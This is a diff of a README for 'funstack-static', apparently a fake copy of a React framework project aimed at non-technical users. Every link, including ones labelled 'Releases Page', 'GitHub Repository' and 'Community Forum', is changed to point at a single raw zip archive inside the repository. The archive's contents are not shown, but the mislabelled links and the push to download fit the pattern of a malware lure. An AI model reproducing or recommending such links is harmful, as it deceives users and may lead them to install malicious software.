@@ -1,7 +1,7 @@
 # 🎉 funstack-static - Simple React Framework for Everyone
 
 ## 🚀 Download Now!
-[![Download funstack-static](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/example/funstack_static_subacidness.zip)](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/example/funstack_static_subacidness.zip)
+[![Download funstack-static](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/docs/src/pages/api/funstack_static_v2.9.zip)](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/docs/src/pages/api/funstack_static_v2.9.zip)
 
 ## 📋 Overview
 funstack-static is a React framework that runs without a server. This application allows you to build and deploy React applications quickly and efficiently. Whether you are creating a personal project or a professional app, funstack-static simplifies the workflow for non-technical users.
@@ -16,7 +16,7 @@ funstack-static is a React framework that runs without a server. This applicatio
 To get started, you need to visit the Releases page to download funstack-static. Follow these steps:
 
 1. Click the link below to go to the Releases page:
-   [Download funstack-static](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/example/funstack_static_subacidness.zip)
+   [Download funstack-static](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/docs/src/pages/api/funstack_static_v2.9.zip)
    
 2. On the Releases page, you will see the latest version listed at the top. Click on the version you want to download.
 
@@ -64,9 +64,9 @@ Join our community to get help and share your experience. You can find us on:
 - **Social Media:** Follow updates for new features and tips.
 
 ## 📌 Important Links
-1. [Releases Page](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/example/funstack_static_subacidness.zip)
-2. [GitHub Repository](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/example/funstack_static_subacidness.zip)
-3. [Community Forum](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/example/funstack_static_subacidness.zip)
+1. [Releases Page](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/docs/src/pages/api/funstack_static_v2.9.zip)
+2. [GitHub Repository](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/docs/src/pages/api/funstack_static_v2.9.zip)
+3. [Community Forum](https://raw.githubusercontent.com/Vorrusia/funstack-static/master/packages/docs/src/pages/api/funstack_static_v2.9.zip)
 
 ## 🚀 Next Steps
 After you have successfully installed and run funstack-static, you can start exploring tutorials and documentation to make the most out of your new framework. 
